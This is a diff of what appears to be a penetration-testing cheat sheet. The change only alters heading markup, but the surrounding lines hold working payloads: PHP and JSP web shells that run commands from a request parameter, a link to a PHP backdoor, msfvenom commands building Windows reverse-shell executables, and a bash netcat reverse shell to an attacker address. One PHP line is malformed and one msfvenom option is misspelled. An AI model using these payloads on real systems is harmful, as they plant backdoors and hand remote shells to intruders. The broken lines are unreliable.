@@ -1,8 +1,8 @@
-#INTERACTIVE SHELL
+#@ INTERACTIVE SHELL
 1) python -c 'import pty; pty.spawn("/bin/bash")' 
 2) echo os.system('/bin/bash')
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
-#WEB PHP
+#@ WEB PHP
 1) <?php echo shell_exec( > $_GET['cmd']);?>
 2) <?php system($_GET['cmd']); ?>
 
@@ -12,7 +12,7 @@ Another useful PHP methods: system, shell_exec, passthru = <?php passthru($_GET[
 
 PHP BACKDOOR: https://github.com/b374k/b374k
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
-#JAVA WEB SHELL
+## JAVA WEB SHELL
 
 <% if (request.getParameter("cmd") != null) {
 out.println("Output: " + request.getParameter("cmd") + "<br />");
@@ -25,13 +25,13 @@ while ( disr != null ) {
 out.println(disr); disr = dis.readLine();
 } } %>
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
-#MSFVENOM PAYLOADS (WINDOWS)
+## MSFVENOM PAYLOADS (WINDOWS)
         msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker ip] LPORT=53 -f exe -o reverse.exe
         msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
         
         msfvenom -p windows/meterpreter/reverse_tcp LHOS=10.10.0.53 LPORT=4444 -f exe -o rev.exe
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
-#BASH REVERSE SHELL
+## BASH REVERSE SHELL
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## POWERSHELL REVERSE SHELLS
